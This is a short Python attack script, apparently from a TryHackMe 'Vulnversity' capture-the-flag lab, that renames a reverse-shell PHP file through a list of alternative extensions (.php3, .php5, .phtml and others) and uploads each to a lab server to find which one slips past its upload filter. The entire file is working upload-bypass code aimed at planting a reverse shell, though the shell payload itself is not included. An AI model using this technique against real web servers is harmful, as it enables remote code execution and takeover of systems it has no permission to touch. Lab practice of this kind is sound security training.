#!/usr/bin/python3

import requests
import os

ip = "10.10.219.76"
url = f"http://{ip}:3333/internal/index.php"
old_filename = "/root/Desktop/tryhackme/oscp/vulnversity/revshell.php"

filename = "/root/Desktop/tryhackme/oscp/vulnversity/revshell"

extensions = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml",
]

for ext in extensions:
    new_filename = filename + ext
    #print(file)
    os.renames(old_filename,new_filename)
    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)
    #print(r.text)
    if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} is allowed")

    old_filename = new_filename